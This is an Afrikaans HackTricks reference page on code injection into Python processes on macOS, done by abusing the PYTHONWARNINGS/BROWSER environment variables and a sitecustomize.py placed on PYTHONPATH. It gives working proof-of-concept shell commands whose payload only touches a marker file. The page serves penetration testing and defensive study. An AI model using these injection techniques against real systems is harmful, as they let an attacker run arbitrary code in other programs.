# macOS Python Application Injection

{{#include ../../../banners/hacktricks-training.md}}

## Via die `PYTHONWARNINGS`- en `BROWSER`-omgewingsveranderlikes

As 'n aanvaller 'n Python-proses se omgewing kan beheer, kan die kombinasie van `PYTHONWARNINGS` en `BROWSER` command execution trigger wanneer Python die `antigravity`-module invoer terwyl 'n vervaardigde waarskuwingsopsie verwerk word. Die tegniek maak staat daarop dat `antigravity` 'n URL met Python se `webbrowser`-module oopmaak, wat die `BROWSER`-omgewingsveranderlike eerbiedig.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Via `PYTHONPATH` en `sitecustomize.py`

Tydens normale opstart voeg Python se `site`-module werfspesifieke paaie by en probeer dit daarna om ’n module genaamd `sitecustomize` in te voer. Deur ’n aanvaller-leesbare gids eerste op `PYTHONPATH` te plaas, kan ’n aanvaller wat beheer oor die prosesomgewing het, Python ’n payload laat invoer voordat die teikenskrip uitgevoer word. Die `-S`-flag deaktiveer outomatiese `site`-inisialisering, terwyl geïsoleerde modus (`-I`) `PYTHONPATH` ignoreer en `-s` en `-E` impliseer.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking met Omgewingsveranderlikes - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Werfspesifieke konfigurasiehaak](https://docs.python.org/3/library/site.html)
- [3] [Python-opdragreël en omgewing](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
